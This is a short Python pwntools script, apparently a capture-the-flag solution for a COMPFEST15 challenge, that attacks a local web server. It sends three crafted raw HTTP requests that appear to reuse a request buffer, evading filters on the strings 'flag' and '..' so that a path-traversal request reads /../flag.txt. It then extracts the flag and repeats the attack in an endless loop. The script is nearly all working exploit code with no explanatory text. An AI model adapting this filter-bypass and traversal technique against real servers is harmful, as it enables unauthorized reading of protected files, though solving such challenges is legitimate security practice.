from pwn import *

context.log_level = "debug"
HOST, PORT = "127.0.0.1", 8080


def exploit():
    # Goal: GET /../flag.txt
    try:
        # =-=-=-= Initial Request =-=-=-=
        # from -> ''
        # to   -> 'GET  /./xlag.txt'
        io = remote(HOST, PORT)
        payload = f"GET{' ' * (0x20-3) + '/./xlag.txt?password=fib'} HTTP/1.1"
        io.send(payload.encode())
        io.close()

        # =-=-=-= Bypass 'flag' blacklist =-=-=-=
        # from -> 'GET  /./xlag.txt'
        # to   -> 'GET  /./flag.txt'
        io = remote(HOST, PORT)
        payload = f"GET{' ' * (0x20-3)}/./f"
        io.send(payload.encode())
        io.close()

        # =-=-=-= Bypass '..' blacklist =-=-=-=
        # from -> 'GET  /./flag.txt'
        # to   -> 'GET /../flag.txt'
        io = remote(HOST, PORT)
        payload = f"GET{' ' * (0x20-4)}/."
        io.send(payload.encode())

        # =-=-=-= Profit =-=-=-=
        prefix = b"COMPFEST15{"
        io.recvuntil(prefix, timeout=5)
        flag = prefix + io.recvuntil(b"}")

        log.success(f"flag: {flag.decode()}")
        io.close()
    except Exception as e:
        print(e)
        io.close()


while True:
    exploit()
    sleep(1)
